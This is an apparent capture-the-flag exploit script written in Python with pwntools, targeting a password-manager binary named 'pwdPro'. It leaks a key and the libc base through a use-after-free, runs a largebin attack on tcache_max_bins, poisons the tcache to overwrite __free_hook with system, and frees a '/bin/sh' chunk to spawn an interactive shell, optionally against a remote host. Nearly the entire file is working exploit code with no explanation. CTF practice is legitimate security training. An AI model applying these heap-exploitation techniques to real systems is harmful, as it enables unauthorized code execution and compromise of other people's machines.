#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  exp.py
# @Author  :  woodwhale
# @Time    :  2021/10/07 11:35:21
# -----------------------------------

from pwn import *
from LibcSearcher import *
import sys, subprocess, warnings, os

arglen = len(sys.argv)
warnings.filterwarnings('ignore')
def ret2libc(leak,func,binary=null):
    libc = LibcSearcher(func,leak) if binary == null else binary
    base = leak - libc.dump(func) if binary == null else leak - libc.sym[func]
    system = base + libc.dump('system') if binary == null else base + libc.sym['system']
    binsh = base + libc.dump('str_bin_sh') if binary == null else next(libc.search(b'/bin/sh'))
    return (system,binsh)
def hack(pwn):
    global io,binary,libc
    times = 0
    while True:
        try:
            times+=1
            clear()
            info(f'time ================> {times}')
            pwn()
        except:
            io.close()
            io = proc(binary,libc.path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))
s           =       lambda data             : io.send(data)
sa          =       lambda rv,data          : io.sendafter(rv,data)
sl          =       lambda data             : io.sendline(data)
sla         =       lambda rv,data          : io.sendlineafter(rv,data)
r           =       lambda num              : io.recv(num)
rl          =       lambda keepends=True    : io.recvline(keepends)
ru          =       lambda data,drop=True   : io.recvuntil(data,drop)
ia          =       lambda                  : io.interactive()
uu32        =       lambda data             : u32(data.ljust(4,b'\x00'))
uu64        =       lambda data             : u64(data.ljust(8,b'\x00'))
i16         =       lambda data             : int(data,16)
leak        =       lambda name,addr        : log.success('\033[33m{}\033[0m = \033[31m{:#x}\033[0m'.format(name, addr))
info        =       lambda data             : log.info(f'\033[36m{data}\033[0m')
dbg         =       lambda point=null       : (gdb.attach(io) if point == null else gdb.attach(io,f'b {point}')) if DEBUG else null
og          =       lambda binary           : list(map(int,subprocess.check_output(['one_gadget','--raw','-f',binary]).decode().strip('\n').split(' ')))
rg          =       lambda binary,only,grep : i16(subprocess.check_output([f"ROPgadget --binary {binary} --only '{only}' | grep {grep}"],shell=True).decode().split(' ')[0])
setlibc     =       lambda leak,func        : leak - libc.sym[func]
libcpath    =       lambda binary           : subprocess.check_output(['ldd',binary]).decode().replace('	', '').split('\n')[1].split(' ')[2] if GLIBC else subprocess.check_output(['ls | grep libc*.so'],shell=True).decode().strip('\n').split('\n')[0]
proc        =       lambda binary,libc=null : process(binary) if GLIBC else process(binary,env={'LD_PRELOAD':'./'+libc})
clear       =       lambda                  : os.system('clear')

# context.log_level='debug'
context.arch='amd64'
context.terminal = ['gnome-terminal','-x', 'bash','-c']
DEBUG = 1
GLIBC = 1
binary = './pwdPro'
elf = ELF(binary)
libc = ELF(libcpath(binary))
libc.path = libcpath(binary)
io = proc(binary,libc.path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))

def cmd(idx):
    sla("Choice:",str(idx))
    
def add(index,size,content="a"):
    cmd(1)
    sla("Add:",str(index))
    sla("Save:",str(index))
    sla("Pwd:",str(size))
    sleep(0.1)
    sa("Pwd:",content)

def edit(index,content):
    cmd(2)
    sla("Edit:",str(index))
    sleep(0.1)
    s(content)

def show(index):
    cmd(3)
    sla("Check",str(index))

def free(index):
    sleep(0.1)
    cmd(4)
    sla("Delete:",str(index))

def recover(index):
    cmd(5)
    sla("Recover:",str(index))

add(0,0x528,"\n")
ru("Save ID:")
key = uu64(r(8))
leak("key",key)

add(1,0x500,"\n")
add(2,0x518,"\n")
add(3,0x500,"\n")
add(4,0x500,"\n")

free(0)
recover(0)
show(0)
ru("Pwd is: ")
libc.address = (uu64(r(8)) ^ key) - (0x7f18037d3bea-0x7f18035e8000)
leak("base",libc.address)

add(5,0x538,"\n")   # put 0 to large bin

tcache_max_bins = libc.address + 0x1eb2d0
tcache_struct = libc.address + 0x1f3530
free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]
leak("tcache_max_bins",tcache_max_bins)

free(2)
recover(2)
show(0)
ru("Pwd is: ")
fd = uu64(r(8)) ^ key
r(8)
fd_next = uu64(r(8)) ^ key
edit(0,p64(fd)*2+p64(fd_next)+p64(tcache_max_bins-0x20))

# set tcache_max_bins to vary big
add(6,0x530,"\n")   # put 2 to largebin

sleep(1)
free(1)
free(4)
recover(4)
edit(4,p64(free_hook))
add(7,0x500,"\n")
add(8,0x500,"\n")
edit(8,p64(system))
# dbg()
sleep(0.1)

edit(3,b"/bin/sh\x00")

# dbg()
free(3)

# dbg()

ia()